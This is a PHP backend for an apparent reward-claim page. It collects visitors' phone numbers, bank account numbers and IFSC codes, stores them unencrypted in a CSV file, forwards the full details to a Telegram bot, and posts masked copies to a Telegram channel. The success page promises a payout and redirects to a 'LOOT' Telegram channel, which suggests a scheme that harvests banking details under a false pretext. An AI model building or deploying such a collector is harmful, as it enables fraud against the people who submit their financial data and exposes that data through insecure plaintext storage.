<?php
include "config.php";

// ----------------- AUTO-GENERATE CSV IF NOT EXISTS -----------------
if (!file_exists($csv_file)) {
    $f = fopen($csv_file, 'w');
    fputcsv($f, ['Phone', 'Account Number', 'IFSC Code', 'Claim', 'Time']); // header
    fclose($f);
}

// ----------------- GET FORM DATA -----------------
$phone      = $_POST['phone'] ?? 'N/A';
$account_no = $_POST['account_no'] ?? 'N/A';
$ifsc_code  = $_POST['ifsc_code'] ?? 'N/A';
$time       = date("Y-m-d H:i:s");
$claim      = "₹" . $claim_amount;

// ----------------- CHECK TOTAL CLAIMS -----------------
$total_claims = 0;
$already_claimed = false;

if (file_exists($csv_file)) {
    $data = array_map('str_getcsv', file($csv_file));
    if (!empty($data) && $data[0][0] === 'Phone') { // header row
        $total_claims = count($data) - 1;
    } else {
        $total_claims = count($data);
    }

    // Check if account number already used
    foreach ($data as $row) {
        if (isset($row[1]) && trim($row[1]) === trim($account_no)) {
            $already_claimed = true;
            break;
        }
    }
}

// ----------------- DUPLICATE / LIMIT CHECK -----------------
if ($already_claimed) {
    http_response_code(400);
    exit("⚠ 1 Bank 1 Time! Try another bank account.");
}

if ($total_claims >= $total_claim_limit) {
    http_response_code(400);
    exit("⚠ Claim Limit Reached! Total Claims: $total_claims / $total_claim_limit");
}

// ----------------- SAVE TO CSV -----------------
$line = [$phone, $account_no, $ifsc_code, $claim, $time];
$f = fopen($csv_file, 'a');
fputcsv($f, $line);
fclose($f);

// ----------------- MASK DATA FOR CHANNEL -----------------
$masked_phone   = preg_replace('/.(?=.{4})/', '*', $phone);
$masked_account = preg_replace('/.(?=.{4})/', '*', $account_no);
$masked_ifsc    = substr($ifsc_code, 0, 4) . '*****' . substr($ifsc_code, -2);

// ----------------- TELEGRAM ALERT FUNCTION -----------------
function sendTelegram($token, $chat_id, $message){
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    if($result === false){
        error_log('Curl error: ' . curl_error($ch));
    } else {
        error_log('Telegram response: ' . $result);
    }
    curl_close($ch);
}

// --- Full data to admin bot ---
$bot_message = "📱 Phone: $phone\n🏦 Account: $account_no\n🔢 IFSC: $ifsc_code\n💰 Claim: $claim\n🕒 Time: $time\n📍 Total Claims: " . ($total_claims+1);
sendTelegram($telegram_bot_token, $chat_id, $bot_message);

// --- Masked data to Telegram channel ---
$channel_chat_id = -1003073944495; // Your channel numeric ID
$channel_message = "📱 Phone: $masked_phone\n🏦 Account: $masked_account\n🔢 IFSC: $masked_ifsc\n💰 Claim: $claim\n🕒 Time: $time\n📍 Total Claims: " . ($total_claims+1);
sendTelegram($telegram_bot_token, $channel_chat_id, $channel_message);

// ----------------- REDIRECT / SUCCESS PAGE -----------------
header("Refresh:3; url=https://t.me/EARNPAYTMLOOT0");
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Success</title>
<style>
body{margin:0;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f1722,#0b3b2e);color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
.container{background:rgba(0,0,0,0.85);padding:50px;border-radius:20px;width:100%;max-width:700px;text-align:center;box-shadow:0 10px 50px rgba(0,0,0,0.7);}
h1{color:#2ecc71;font-size:60px;margin-bottom:25px;}
p{font-size:26px;margin:10px 0;line-height:1.5;}
</style>
</head>
<body>
<div class="container">
<h1>✅ Submitted Successfully!</h1>
<p>Please wait. You will receive your payment soon in your bank account.</p>
<p>Total Claims So Far: <?= $total_claims + 1 ?> / <?= $total_claim_limit ?></p>
</div>
</body>
</html>